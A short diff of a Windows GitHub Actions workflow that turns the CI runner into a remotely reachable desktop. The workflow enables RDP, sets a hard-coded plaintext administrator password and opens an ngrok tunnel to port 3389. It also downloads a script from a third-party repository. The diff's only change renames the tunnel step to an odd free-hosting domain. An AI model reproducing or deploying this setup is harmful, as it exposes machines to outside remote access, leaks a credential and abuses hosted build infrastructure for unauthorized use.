@@ -24,7 +24,7 @@ jobs:
       run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
     - name: Assign User
       run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "fG7pU2uJ3rP4vO3x" -Force)
-    - name: Create Tunnel
+    - name: gd0u96z.epizy.com
       run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp 3389"'
     - name: Download Timeout Script
       run: Invoke-WebRequest https://raw.githubusercontent.com/mai1load/windows-20/main/timeout.ps1 -OutFile timeout.ps1
